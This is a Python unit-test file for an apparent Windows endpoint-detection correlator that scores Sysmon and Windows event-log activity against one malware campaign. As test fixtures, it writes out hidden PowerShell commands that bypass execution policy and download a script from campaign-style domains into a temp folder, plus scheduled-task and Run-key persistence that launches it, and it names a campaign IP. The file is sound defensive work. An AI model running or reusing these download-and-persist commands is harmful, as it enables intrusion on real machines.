import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from guardian.indicators import KNOWN_SAMPLE_ARTIFACTS
from guardian.realtime import RealtimeCorrelator, _EvtSubscribe, build_subscription_plan, parse_event_xml, redact_sensitive_text


class RealtimeTelemetryTests(unittest.TestCase):
    def test_parse_sysmon_event_xml_named_fields(self):
        xml = r'''<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
          <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>
          <EventRecordID>445</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel>
          <TimeCreated SystemTime="2026-11-21T04:00:00.000Z"/><Execution ProcessID="4"/></System>
          <EventData><Data Name="ProcessGuid">{abc}</Data><Data Name="ProcessId">1234</Data>
          <Data Name="Image">C:\\Windows\\System32\\notepad.exe</Data>
          <Data Name="Hashes">SHA256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</Data></EventData>
        </Event>'''
        event = parse_event_xml(xml)
        self.assertEqual(event["event_id"], 1)
        self.assertEqual(event["record_id"], "445")
        self.assertEqual(event["data"]["ProcessId"], "1234")
        self.assertIn("SHA256=", event["data"]["Hashes"])

    def test_runtimebroker_name_alone_is_not_a_finding(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "1",
            "data": {"Image": r"C:\Windows\System32\RuntimeBroker.exe", "ProcessId": "100", "ParentProcessId": "4", "CommandLine": ""},
        }, "Sysmon")
        self.assertFalse(any(x.get("type") == "finding" for x in events))

    def test_generic_encoded_powershell_is_not_a_tctc_finding(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "2",
            "data": {"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "ProcessId": "101", "ParentProcessId": "100", "CommandLine": "powershell.exe -NoProfile -EncodedCommand YWJjZA=="},
        }, "Sysmon")
        self.assertFalse(any(x.get("type") == "finding" for x in events))

    def test_campaign_powershell_requires_marker_and_download_or_stealth_context(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "3",
            "data": {"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "ProcessId": "0x65", "ParentProcessId": "0x4",
                     "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass Invoke-WebRequest https://benderoflight.com/nfront.php -OutFile %TEMP%\\Local\\Z797.ps1"},
        }, "Sysmon")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "High")
        self.assertEqual(findings[0]["metadata"]["pid"], "101")
        self.assertIn("Z797.ps1", findings[0]["evidence"][-1])

    def test_unrelated_process_is_not_flagged_even_if_name_is_script_host(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "4",
            "data": {"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "ProcessId": "111", "ParentProcessId": "4", "CommandLine": "powershell.exe Get-Service"},
        }, "Sysmon")
        self.assertFalse(any(x.get("type") == "finding" for x in events))

    def test_processaccess_target_side_match_does_not_attribute_unrelated_source(self):

        events = []
        engine = RealtimeCorrelator(events.append)
        target_guid = "{22222222-2222-2222-2222-222222222222}"
        engine._remember_process("456", {"image": r"C:\Windows\explorer.exe", "guid": target_guid}, True)
        engine.handle_event({"event_id": 10, "provider": "Microsoft-Windows-Sysmon", "record_id": "role-10", "data": {
            "SourceProcessGUID": "{11111111-1111-1111-1111-111111111111}", "SourceProcessId": "1234",
            "SourceImage": r"C:\Windows\System32\example.exe", "TargetProcessGUID": target_guid,
            "TargetProcessId": "456", "TargetImage": r"C:\Windows\explorer.exe", "GrantedAccess": "0x1fffff",
        }}, "Sysmon")
        self.assertFalse(any(x.get("type") == "finding" for x in events))
    def test_processaccess_read_only_access_is_not_reported(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 10, "provider": "Microsoft-Windows-Sysmon", "record_id": "read-only-10",
            "data": {
                "SourceProcessGUID": "{11111111-1111-1111-1111-111111111111}",
                "SourceProcessId": "1234", "SourceImage": r"C:\Windows\System32\example.exe",
                "TargetProcessId": "456", "TargetImage": r"C:\Windows\explorer.exe",
                "GrantedAccess": "0x0010",
            },
        }, "Sysmon")
        self.assertFalse(any(x.get("type") == "finding" for x in events))

    def test_processaccess_requires_complete_guid_pid_and_image_identity(self):

        events = []
        engine = RealtimeCorrelator(events.append)
        guid = "{11111111-1111-1111-1111-111111111111}"
        engine.handle_event({"event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "actor-1", "data": {
            "ProcessGuid": guid, "ProcessId": "1234", "ParentProcessId": "4", "Image": r"C:\Windows\System32\powershell.exe",
            "CommandLine": "Invoke-WebRequest https://benderoflight.com/nfront.php",
        }}, "Sysmon")
        engine.handle_event({"event_id": 10, "provider": "Microsoft-Windows-Sysmon", "record_id": "incomplete-10", "data": {
            "SourceProcessGUID": guid, "SourceProcessId": "1234", "TargetProcessId": "456",
            "TargetImage": r"C:\Windows\explorer.exe", "GrantedAccess": "0x1fffff",
        }}, "Sysmon")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertFalse(any(f["category"] in {"Process behavior correlation", "Process behavior context"} for f in findings))
    def test_processaccess_attribution_requires_exact_source_guid_pid_and_image(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        guid = "{11111111-1111-1111-1111-111111111111}"
        image = r"C:\Windows\System32\powershell.exe"
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "actor-2",
            "data": {"ProcessGuid": guid, "ProcessId": "1234", "ParentProcessId": "4",
                     "Image": image, "CommandLine": "Invoke-WebRequest https://benderoflight.com/nfront.php"},
        }, "Sysmon")
        engine.handle_event({
            "event_id": 10, "provider": "Microsoft-Windows-Sysmon", "record_id": "linked-10",
            "data": {"SourceProcessGUID": guid, "SourceProcessId": "1234", "SourceImage": image,
                     "TargetProcessId": "456", "TargetImage": r"C:\Windows\explorer.exe",
                     "GrantedAccess": "0x1fffff"},
        }, "Sysmon")
        correlated = [x["finding"] for x in events if x.get("type") == "finding" and x["finding"]["category"] == "Process behavior correlation"]
        self.assertEqual(len(correlated), 1)
        self.assertEqual(correlated[0]["severity"], "High")
        self.assertTrue(correlated[0]["metadata"]["actor_side_correlated"])

    def test_child_process_inherits_lineage_using_parent_process_guid(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        parent_guid = "{11111111-1111-1111-1111-111111111111}"
        child_guid = "{22222222-2222-2222-2222-222222222222}"
        parent_image = r"C:\Windows\System32\powershell.exe"
        child_image = r"C:\Windows\System32\cmd.exe"
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "parent-1",
            "data": {"ProcessGuid": parent_guid, "ProcessId": "1234", "ParentProcessId": "4",
                     "Image": parent_image, "CommandLine": "Invoke-WebRequest https://benderoflight.com/nfront.php"},
        }, "Sysmon")
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "child-1",
            "data": {"ProcessGuid": child_guid, "ParentProcessGuid": parent_guid,
                     "ProcessId": "1235", "ParentProcessId": "1234", "ParentImage": parent_image,
                     "Image": child_image, "CommandLine": "cmd.exe /c whoami"},
        }, "Sysmon")
        inherited_create = [x["finding"] for x in events if x.get("type") == "finding"
                            and x["finding"].get("category") == "Process lineage"
                            and str((x["finding"].get("metadata") or {}).get("pid")) == "1235"]
        self.assertEqual(len(inherited_create), 1)
        self.assertEqual(inherited_create[0]["severity"], "Medium")
        parent_create = [x["finding"] for x in events if x.get("type") == "finding"
                         and x["finding"].get("category") == "Process lineage"
                         and str((x["finding"].get("metadata") or {}).get("pid")) == "1234"]
        self.assertEqual(len(parent_create), 1)
        self.assertEqual(parent_create[0]["severity"], "High")
        engine.handle_event({
            "event_id": 10, "provider": "Microsoft-Windows-Sysmon", "record_id": "child-access-10",
            "data": {"SourceProcessGUID": child_guid, "SourceProcessId": "1235", "SourceImage": child_image,
                     "TargetProcessId": "456", "TargetImage": r"C:\Windows\explorer.exe",
                     "GrantedAccess": "0x1fffff"},
        }, "Sysmon")
        linked = [x["finding"] for x in events if x.get("type") == "finding" and x["finding"]["category"] == "Process behavior correlation"]
        self.assertEqual(len(linked), 1)
        self.assertEqual(linked[0]["metadata"]["source_process_guid"], child_guid)
        self.assertEqual(linked[0]["severity"], "Medium")
        self.assertEqual(linked[0]["confidence"], "Medium")
        self.assertEqual(linked[0]["metadata"]["correlation_basis"], "ancestor")

    def test_direct_source_processaccess_remains_high_confidence(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        guid = "{33333333-3333-3333-3333-333333333333}"
        image = r"C:\Windows\System32\powershell.exe"
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "direct-source",
            "data": {"ProcessGuid": guid, "ProcessId": "7788", "ParentProcessId": "4",
                     "Image": image, "CommandLine": "Invoke-WebRequest https://benderoflight.com/nfront.php"},
        }, "Sysmon")
        engine.handle_event({
            "event_id": 10, "provider": "Microsoft-Windows-Sysmon", "record_id": "direct-access",
            "data": {"SourceProcessGUID": guid, "SourceProcessId": "7788", "SourceImage": image,
                     "TargetProcessId": "456", "TargetImage": r"C:\Windows\explorer.exe", "GrantedAccess": "0x1fffff"},
        }, "Sysmon")
        linked = [x["finding"] for x in events if x.get("type") == "finding" and x["finding"]["category"] == "Process behavior correlation"]
        self.assertEqual(len(linked), 1)
        self.assertEqual(linked[0]["severity"], "High")
        self.assertEqual(linked[0]["metadata"]["correlation_basis"], "direct")

    def test_remote_thread_event_uses_source_actor_not_target(self):

        events = []
        engine = RealtimeCorrelator(events.append)
        target_guid = "{22222222-2222-2222-2222-222222222222}"
        engine._remember_process("456", {"image": r"C:\Windows\explorer.exe", "guid": target_guid}, True)
        engine.handle_event({"event_id": 8, "provider": "Microsoft-Windows-Sysmon", "record_id": "remote-thread-8", "data": {
            "SourceProcessGUID": "{11111111-1111-1111-1111-111111111111}", "SourceProcessId": "1234",
            "SourceImage": r"C:\Windows\System32\example.exe", "TargetProcessGUID": target_guid,
            "TargetProcessId": "456", "TargetImage": r"C:\Windows\explorer.exe",
        }}, "Sysmon")
        self.assertFalse(any(x.get("type") == "finding" for x in events))
    def test_task_scheduler_and_wmi_events_are_ioc_gated(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 106, "provider": "Microsoft-Windows-TaskScheduler", "record_id": "task-benign",
            "data": {"TaskName": r"\Microsoft\Windows\Update", "UserContext": "SYSTEM"},
        }, "Task Scheduler")
        engine.handle_event({
            "event_id": 140, "provider": "Microsoft-Windows-TaskScheduler", "record_id": "task-ioc",
            "data": {"TaskName": r"\Update\Z797", "ActionName": r"powershell.exe -File %TEMP%\Local\Z797.ps1 https://benderoflight.com/nfront.php"},
        }, "Task Scheduler")
        engine.handle_event({
            "event_id": 5858, "provider": "Microsoft-Windows-WMI-Activity", "record_id": "wmi-ioc",
            "data": {"ClientProcessId": "1234", "ClientProcessName": r"C:\Windows\System32\wmiprvse.exe", "Operation": "ExecQuery https://ruthaiv.com/nback.php"},
        }, "WMI Activity")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 2)
        self.assertEqual({f["category"] for f in findings}, {"Scheduled-task persistence telemetry", "WMI persistence / execution telemetry"})
        self.assertTrue(all(f["metadata"]["campaign_attributed"] for f in findings))

    def test_process_tampering_requires_full_target_identity(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        guid = "{11111111-1111-1111-1111-111111111111}"
        image = r"C:\Windows\System32\RuntimeBroker.exe"
        engine.handle_event({
            "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "target-1",
            "data": {"ProcessGuid": guid, "ProcessId": "800", "ParentProcessId": "4",
                     "Image": image, "CommandLine": "https://benderoflight.com/nfront.php"},
        }, "Sysmon")
        engine.handle_event({
            "event_id": 25, "provider": "Microsoft-Windows-Sysmon", "record_id": "tamper-25",
            "data": {"ProcessGuid": guid, "ProcessId": "801", "Image": image},
        }, "Sysmon")
        findings = [x["finding"] for x in events if x.get("type") == "finding" and x["finding"]["category"] == "Process behavior correlation"]
        self.assertEqual(findings, [])

    def test_exact_hash_and_size_process_event_is_critical_and_hash_scoped(self):
        digest, (size, _label) = next(iter(KNOWN_SAMPLE_ARTIFACTS.items()))
        events = []
        engine = RealtimeCorrelator(events.append)
        with tempfile.TemporaryDirectory() as td:
            os.environ["TEMP"] = td
            stage = Path(td) / "Local"
            stage.mkdir()
            path = stage / "sample.exe"
            with path.open("wb") as f:
                f.truncate(size)
            with patch("guardian.realtime.sha256_file", return_value=digest):
                engine.handle_event({
                    "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "5",
                    "data": {"Image": str(path), "ProcessId": "200", "ParentProcessId": "4",
                             "Hashes": f"SHA256={digest}", "CommandLine": str(path)},
                }, "Sysmon")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "Critical")
        self.assertTrue(findings[0]["metadata"]["hash_size_verified"])
        self.assertEqual(findings[0]["remediation"], "contain_exact_sample_process")
        self.assertEqual(findings[0]["metadata"]["expected_size"], size)
        self.assertTrue(findings[0]["metadata"]["event_driven"])

    def test_known_filename_only_in_exact_staging_path_is_review_not_quarantine(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        with tempfile.TemporaryDirectory() as td:
            os.environ["TEMP"] = td
            stage = Path(td) / "Local"
            stage.mkdir()
            file = stage / "Z797.ps1"
            file.write_text("Write-Output 'ordinary test file'", encoding="utf-8")
            engine.handle_file(str(file), operation="created")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "Medium")
        self.assertEqual(findings[0]["remediation"], "none")
        self.assertFalse(findings[0]["metadata"]["hash_size_verified"])

    def test_file_changing_during_hash_is_deferred_not_confirmed(self):
        digest, (size, _label) = next(iter(KNOWN_SAMPLE_ARTIFACTS.items()))
        events = []
        engine = RealtimeCorrelator(events.append)
        with tempfile.TemporaryDirectory() as td:
            os.environ["TEMP"] = td
            stage = Path(td) / "Local"
            stage.mkdir()
            file_path = stage / "payload.exe"
            with file_path.open("wb") as handle:
                handle.truncate(size)

            def mutate_during_hash(path):
                with open(path, "ab") as handle:
                    handle.write(b"changed")
                return digest

            with patch("guardian.realtime.sha256_file", side_effect=mutate_during_hash):
                engine.handle_file(str(file_path), operation="created", source_pid="123")

        self.assertFalse(any(x.get("type") == "finding" for x in events))
        self.assertTrue(any("changed during hashing" in x.get("message", "") for x in events if x.get("type") == "log"))

    def test_campaign_network_event_is_medium_without_process_correlation(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 3, "provider": "Microsoft-Windows-Sysmon", "record_id": "6",
            "data": {"Image": r"C:\Windows\System32\svchost.exe", "ProcessId": "300",
                     "DestinationIp": "109.238.86.137", "DestinationHostname": ""},
        }, "Sysmon")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "Medium")
        self.assertEqual(findings[0]["remediation"], "none")

    def test_sysmon_hash_and_size_are_rejected_if_live_file_hash_changed(self):
        digest, (size, _label) = next(iter(KNOWN_SAMPLE_ARTIFACTS.items()))
        events = []
        engine = RealtimeCorrelator(events.append)
        with tempfile.TemporaryDirectory() as td:
            os.environ["TEMP"] = td
            stage = Path(td) / "Local"
            stage.mkdir()
            path = stage / "sample.exe"
            with path.open("wb") as handle:
                handle.truncate(size)
            with patch("guardian.realtime.sha256_file", return_value="0" * 64):
                engine.handle_event({
                    "event_id": 1, "provider": "Microsoft-Windows-Sysmon", "record_id": "hash-mismatch",
                    "data": {"Image": str(path), "ProcessId": "210", "ParentProcessId": "4",
                             "Hashes": f"SHA256={digest}", "CommandLine": str(path)},
                }, "Sysmon")
        self.assertFalse(any(x.get("type") == "finding" for x in events))

    def test_security_4688_uses_new_process_id_and_creator_pid_fields(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 4688, "provider": "Microsoft-Windows-Security-Auditing", "record_id": "4688-1",
            "data": {
                "NewProcessId": "0x65",
                "ProcessId": "0x4",
                "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "ParentProcessName": r"C:\Windows\System32\services.exe",
                "CommandLine": r"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass Invoke-WebRequest https://benderoflight.com/nfront.php -OutFile %TEMP%\Local\Z797.ps1",
            },
        }, "Security")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["metadata"]["pid"], "101")
        self.assertEqual(findings[0]["metadata"]["parent_pid"], "4")

    def test_unrelated_run_key_change_is_not_a_finding(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 13, "provider": "Microsoft-Windows-Sysmon", "record_id": "reg-1",
            "data": {
                "ProcessId": "400", "Image": r"C:\Windows\System32\reg.exe",
                "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Teams",
                "Details": r"C:\Program Files\Microsoft\Teams\current\Teams.exe",
            },
        }, "Sysmon")
        self.assertFalse(any(x.get("type") == "finding" for x in events))

    def test_run_key_with_exact_campaign_reference_is_correlated(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({
            "event_id": 13, "provider": "Microsoft-Windows-Sysmon", "record_id": "reg-2",
            "data": {
                "ProcessId": "401", "Image": r"C:\Windows\System32\reg.exe",
                "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Update",
                "Details": r"powershell.exe -File C:\Users\Public\AppData\Local\Temp\Local\Z797.ps1",
            },
        }, "Sysmon")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["category"], "Persistence telemetry")
        self.assertEqual(findings[0]["remediation"], "none")

    def test_pid_reuse_clears_old_suspicious_process_state(self):
        engine = RealtimeCorrelator()
        engine._remember_process("777", {"image": "old-suspicious.exe", "parent_pid": "1", "guid": "old"}, True)
        self.assertTrue(engine._process_is_related("777"))
        engine._remember_process("777", {"image": "new-benign.exe", "parent_pid": "4", "guid": "new"}, False)
        self.assertFalse(engine._process_is_related("777"))

    def test_sysmon_process_guid_correlates_event_even_when_pid_is_missing(self):
        engine = RealtimeCorrelator()
        engine._remember_process("888", {"image": "suspicious.exe", "parent_pid": "4", "guid": "{GUID-ONE}"}, True)
        self.assertTrue(engine._process_is_related("", process_guid="{GUID-ONE}"))
        self.assertFalse(engine._process_is_related("", process_guid="{GUID-TWO}"))

    def test_process_lineage_follows_two_parent_generations_but_not_unrelated_tree(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine._remember_process("501", {"image": r"C:\Windows\System32\powershell.exe", "parent_pid": "500", "guid": "g-501"}, True)
        engine._remember_process("502", {"image": r"C:\Windows\System32\cmd.exe", "parent_pid": "501", "guid": "g-502"}, False)
        self.assertTrue(engine._process_is_related("503", parent_pid="502"))
        self.assertFalse(engine._process_is_related("900", parent_pid="901"))

    def test_secret_redaction_masks_password_and_token(self):
        result = redact_sensitive_text("powershell -Password hunter2 -Token abc123")
        self.assertNotIn("hunter2", result)
        self.assertNotIn("abc123", result)
        self.assertIn("<redacted>", result)


    def test_event_subscription_keeps_ctypes_callback_references_after_close(self):
        from types import SimpleNamespace
        callback = object()
        calls = []
        wrapper = object.__new__(_EvtSubscribe)
        wrapper.api = SimpleNamespace(EvtClose=lambda handle: calls.append(handle))
        wrapper.handles = [123]
        wrapper.callbacks = [callback]
        wrapper.close()
        self.assertEqual(calls, [123])
        self.assertEqual(wrapper.handles, [])
        self.assertEqual(wrapper.callbacks, [callback])


class SubscriptionPlanTests(unittest.TestCase):
    def test_default_subscription_plan_includes_required_process_file_network_and_persistence_events(self):

        plan = build_subscription_plan()
        queries = {label: query for _channel, query, label in plan}
        self.assertIn("EventID=1", queries["Sysmon"])
        self.assertIn("EventID=11", queries["Sysmon"])
        self.assertIn("EventID=22", queries["Sysmon"])
        self.assertIn("EventID=13", queries["Sysmon"])
        self.assertIn("EventID=4688", queries["Security"])
        self.assertNotIn("EventID=4663", queries["Security"])
        self.assertNotIn("EventID=4719", queries["Security"])
        self.assertIn("EventID=4697", queries["Security"])
        self.assertIn("EventID=4698", queries["Security"])
        self.assertIn("4103", queries["PowerShell"])
        self.assertIn("4104", queries["PowerShell"])
        self.assertIn("EventID=106", queries["Task Scheduler"])
        self.assertIn("EventID=5857", queries["WMI Activity"])
        self.assertNotIn("EventID=27", queries["Sysmon"])
        self.assertNotIn("EventID=17", queries["Sysmon"])
        self.assertNotIn("EventID=23", queries["Sysmon"])
    def test_disabling_sensor_categories_removes_their_event_subscriptions(self):
        plan = build_subscription_plan(
            monitor_processes=False, monitor_files=False, monitor_network=False,
            monitor_persistence=False, monitor_powershell=False,
        )
        self.assertEqual(len(plan), 1)
        self.assertEqual(plan[0][2], "Sysmon")
        self.assertIn("EventID=1", plan[0][1])
        self.assertIn("EventID=4", plan[0][1])
        self.assertIn("EventID=11", plan[0][1])
        self.assertIn("EventID=16", plan[0][1])


class RealtimeSubscriptionRegressionTests(unittest.TestCase):
    def test_sysmon_file_delete_and_timestamp_events_are_subscribed(self):
        plan = build_subscription_plan()
        sysmon_query = next(query for channel, query, label in plan if label == "Sysmon")
        self.assertIn("EventID=2", sysmon_query)
        self.assertIn("EventID=26", sysmon_query)
        self.assertIn("EventID=29", sysmon_query)
        for legacy_or_unconfigured in (17, 18, 23, 27):
            self.assertNotIn(f"EventID={legacy_or_unconfigured}", sysmon_query)

    def test_sysmon_core_process_and_file_events_are_mandatory_even_if_optional_sources_disabled(self):
        plan = build_subscription_plan(monitor_processes=False, monitor_files=False, monitor_network=False, monitor_persistence=False, monitor_powershell=False)
        query = next(query for channel, query, label in plan if label == "Sysmon")
        self.assertIn("EventID=1", query)
        self.assertIn("EventID=11", query)
        self.assertIn("EventID=26", query)

    def test_sysmon_staging_delete_event_is_reported_as_cleanup_evidence_only(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        with tempfile.TemporaryDirectory() as td:
            os.environ["TEMP"] = td
            stage = Path(td) / "Local"; stage.mkdir()
            path = stage / "Z797.ps1"
            engine.handle_event({
                "event_id": 26, "provider": "Microsoft-Windows-Sysmon", "record_id": "delete-26",
                "data": {"TargetFilename": str(path), "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "ProcessId": "400"},
            }, "Sysmon")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["category"], "Staging cleanup telemetry")
        self.assertEqual(findings[0]["remediation"], "none")

    def test_sysmon_timestamp_change_event_is_reported_without_auto_remediation(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        with tempfile.TemporaryDirectory() as td:
            os.environ["TEMP"] = td
            stage = Path(td) / "Local"; stage.mkdir()
            engine.handle_event({
                "event_id": 2, "provider": "Microsoft-Windows-Sysmon", "record_id": "ctime-2",
                "data": {"TargetFilename": str(stage / "crandle.txt"), "Image": r"C:\Windows\System32\powershell.exe", "ProcessId": "401"},
            }, "Sysmon")
        findings = [x["finding"] for x in events if x.get("type") == "finding"]
        self.assertEqual(len(findings), 1)
        self.assertIn("creation-time change", findings[0]["title"])
        self.assertEqual(findings[0]["remediation"], "none")

    def test_sysmon_service_stop_event_emits_sensor_failure(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({"event_id": 4, "provider": "Microsoft-Windows-Sysmon", "record_id": "stop-4", "data": {"State": "Stopped"}}, "Sysmon")
        failures = [event for event in events if event.get("type") == "sensor_failure"]
        self.assertEqual(len(failures), 1)
        self.assertIn("Sysmon service", failures[0]["message"])

    def test_sysmon_configuration_change_stops_protection_claim(self):

        events = []
        engine = RealtimeCorrelator(events.append)
        engine.handle_event({"event_id": 16, "provider": "Microsoft-Windows-Sysmon", "record_id": "config-16", "data": {"Configuration": "changed"}}, "Sysmon")
        failures = [event for event in events if event.get("type") == "sensor_failure"]
        findings = [event["finding"] for event in events if event.get("type") == "finding"]
        self.assertEqual(len(failures), 1)
        self.assertEqual(findings, [])
    def test_sysmon_event27_is_recorded_as_preexecution_block(self):

        events = []
        engine = RealtimeCorrelator(events.append)
        with patch("guardian.realtime._under_staging", return_value=True):
            engine.handle_event({"event_id": 27, "provider": "Microsoft-Windows-Sysmon", "record_id": "block-27", "data": {
                "TargetFilename": r"C:\Users\Test\AppData\Local\Temp\Local\payload.exe",
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "ProcessId": "410", "Hashes": "SHA256=" + "a" * 64,
            }}, "Sysmon")
        self.assertFalse(any(event.get("type") == "finding" for event in events))
    def test_sysmon_event29_detects_pe_in_staging_and_enqueues_hashing(self):

        events = []
        engine = RealtimeCorrelator(events.append)
        engine.enqueue_file = lambda path, pid, guid, image: events.append({"type": "file_queued", "path": path, "pid": pid})
        with patch("guardian.realtime._under_staging", return_value=True):
            engine.handle_event({"event_id": 29, "provider": "Microsoft-Windows-Sysmon", "record_id": "pe-29", "data": {
                "TargetFilename": r"C:\Users\Test\AppData\Local\Temp\Local\payload.exe",
                "Image": r"C:\Windows\System32\powershell.exe", "ProcessId": "411", "Hashes": "SHA256=" + "b" * 64,
            }}, "Sysmon")
        findings = [event["finding"] for event in events if event.get("type") == "finding"]
        queued = [event for event in events if event.get("type") == "file_queued"]
        self.assertEqual(findings, [])
        self.assertEqual(len(queued), 1)
    def test_sysmon_event29_exact_recovered_hash_is_deferred_to_size_verified_file_hashing(self):
        events = []
        engine = RealtimeCorrelator(events.append)
        engine.enqueue_file = lambda path, pid, guid, image: events.append({"type": "file_queued", "path": path, "pid": pid})
        known_hash = next(iter(KNOWN_SAMPLE_ARTIFACTS))
        with patch("guardian.realtime._under_staging", return_value=True):
            engine.handle_event({"event_id": 29, "provider": "Microsoft-Windows-Sysmon", "record_id": "pe-29-exact", "data": {"TargetFilename": r"C:\Users\Test\AppData\Local\Temp\Local\payload.exe", "Image": r"C:\Windows\System32\powershell.exe", "ProcessId": "412", "Hashes": "SHA256=" + known_hash}}, "Sysmon")
        findings = [event["finding"] for event in events if event.get("type") == "finding"]
        queued = [event for event in events if event.get("type") == "file_queued"]
        self.assertEqual(findings, [])
        self.assertEqual(len(queued), 1)


if __name__ == "__main__":
    unittest.main()
